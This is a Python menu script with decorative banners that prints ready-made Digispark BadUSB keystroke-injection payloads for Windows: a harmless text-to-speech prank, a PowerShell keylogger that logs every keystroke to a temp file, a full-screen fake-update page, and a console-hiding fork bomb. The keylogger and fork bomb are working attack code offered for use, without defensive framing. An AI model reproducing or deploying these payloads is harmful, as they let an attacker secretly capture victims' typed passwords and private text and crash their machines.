from random import random,randint
from colorama import Fore,Back


banner1 = """

 .----------------.   .----------------.   .----------------. 
| .--------------. | | .--------------. | | .--------------. |
| |  ____  ____  | | | |    ______    | | | |  ____  ____  | |
| | |_   ||   _| | | | |   / ____ `.  | | | | |_  _||_  _| | |
| |   | |__| |   | | | |   `'  __) |  | | | |   \ \  / /   | |
| |   |  __  |   | | | |   _  |__ '.  | | | |    > `' <    | |
| |  _| |  | |_  | | | |  | \____) |  | | | |  _/ /'`\ \_  | |
| | |____||____| | | | |   \______.'  | | | | |____||____| | |
| |              | | | |              | | | |              | |
| '--------------' | | '--------------' | | '--------------' |
 '----------------'   '----------------'   '----------------' 


"""
banner2 = """


  ██      ██    ████    ██     ██  
 ░██     ░██   █░░░ █  ░░██   ██   
 ░██     ░██  ░    ░█   ░░██ ██    
 ░██████████     ███     ░░███     
 ░██░░░░░░██    ░░░ █     ██░██    
 ░██     ░██   █   ░█    ██ ░░██   
 ░██     ░██  ░ ████    ██   ░░██  
 ░░      ░░    ░░░░    ░░     ░░   
 """


banner3 = """

 ▄         ▄       ▄▄▄▄▄▄▄▄▄▄▄       ▄       ▄ 
▐░▌       ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌     ▐░▌
▐░▌       ▐░▌      ▀▀▀▀▀▀▀▀▀█░▌      ▐░▌   ▐░▌ 
▐░▌       ▐░▌               ▐░▌       ▐░▌ ▐░▌  
▐░█▄▄▄▄▄▄▄█░▌      ▄▄▄▄▄▄▄▄▄█░▌        ▐░▐░▌   
▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌         ▐░▌    
▐░█▀▀▀▀▀▀▀█░▌      ▀▀▀▀▀▀▀▀▀█░▌        ▐░▌░▌   
▐░▌       ▐░▌               ▐░▌       ▐░▌ ▐░▌  
▐░▌       ▐░▌      ▄▄▄▄▄▄▄▄▄█░▌      ▐░▌   ▐░▌ 
▐░▌       ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌     ▐░▌
 ▀         ▀       ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀ 


"""

banner4 = """

HHHHHHHHH     HHHHHHHHH      333333333333333        XXXXXXX       XXXXXXX
H:::::::H     H:::::::H     3:::::::::::::::33      X:::::X       X:::::X
H:::::::H     H:::::::H     3::::::33333::::::3     X:::::X       X:::::X
HH::::::H     H::::::HH     3333333     3:::::3     X::::::X     X::::::X
  H:::::H     H:::::H                   3:::::3     XXX:::::X   X:::::XXX
  H:::::H     H:::::H                   3:::::3        X:::::X X:::::X   
  H::::::HHHHH::::::H           33333333:::::3          X:::::X:::::X    
  H:::::::::::::::::H           3:::::::::::3            X:::::::::X     
  H:::::::::::::::::H           33333333:::::3           X:::::::::X     
  H::::::HHHHH::::::H                   3:::::3         X:::::X:::::X    
  H:::::H     H:::::H                   3:::::3        X:::::X X:::::X   
  H:::::H     H:::::H                   3:::::3     XXX:::::X   X:::::XXX
HH::::::H     H::::::HH     3333333     3:::::3     X::::::X     X::::::X
H:::::::H     H:::::::H     3::::::33333::::::3     X:::::X       X:::::X
H:::::::H     H:::::::H     3:::::::::::::::33      X:::::X       X:::::X
HHHHHHHHH     HHHHHHHHH      333333333333333        XXXXXXX       XXXXXXX

"""

banner5 = """

 ██      ██    ████    ██     ██             ██                      ██
░██     ░██   █░░░ █  ░░██   ██             ░██                     ░██
░██     ░██  ░    ░█   ░░██ ██             ██████  ██████   ██████  ░██
░██████████     ███     ░░███      █████  ░░░██░  ██░░░░██ ██░░░░██ ░██
░██░░░░░░██    ░░░ █     ██░██    ░░░░░     ░██  ░██   ░██░██   ░██ ░██
░██     ░██   █   ░█    ██ ░░██             ░██  ░██   ░██░██   ░██ ░██
░██     ░██  ░ ████    ██   ░░██            ░░██ ░░██████ ░░██████  ███
░░      ░░    ░░░░    ░░     ░░              ░░   ░░░░░░   ░░░░░░  ░░░ 



"""

bannerlist = [banner1 , banner2 , banner3 , banner4 , banner5]
colors = [Fore.RED , Fore.GREEN , Fore.WHITE , Fore.CYAN , Fore.BLUE]

bannerCount = randint(0,4)
count = randint(0,4)
print(colors[count] + bannerlist[bannerCount])

count2 = randint(0,4)
print(colors[count2] + """
|==============================|
|====== insta : h3x_code ======|
|====== Developer : h3x =======|
|==============================|
""")


# ----------------------- scripts ------------------------- 
tallker = """
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("Add-Type -AssemblyName System.speech");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  //Uncomment these lines to use a female voice
  //DigiKeyboard.print("$speak.SelectVoice('Microsoft Zira Desktop')");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(500);
  DigiKeyboard.print("$speak.Speak(\"Here's a joke. Why do Java programmers wear glasses? Because they can't C#.\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);
  for (;;) {
    /*empty*/
  }

}
"""

keylogger = """

#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  // Open Powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Write Keylogger Function
  DigiKeyboard.print(F("$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}

"""


FakeUpdate = """

#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("http://fakeupdate.net/win10ue");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  for(;;){ /*empty*/ }
}

"""

ForkBomb = """

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //Obfuscate the terminal
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Run the fork bomb
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}

"""

# ------------------------------------------------


print(Back.WHITE + Fore.BLACK + """

[1] : Talker
[2] : Keylogger 
[3] : FakeUpdate 
[4] : Fork Bomb
""")
input_user = input(Back.BLUE + Fore.WHITE + " ==> ")
print(Back.RESET)
print("\n")




if input_user == "1":
    print (Fore.RED + "codes : ")
    print(Fore.GREEN + tallker)
elif input_user == "2":
    print (Fore.RED + "codes : ")
    print(Fore.GREEN + keylogger)
elif input_user == "3":
    print (Fore.RED + "codes : ")
    print(Fore.GREEN + FakeUpdate)
elif  input_user == "4":
    print (Fore.RED + "codes : ")
    print(Fore.GREEN + ForkBomb)
else : 
    print (Fore.RED  + "ERROR !")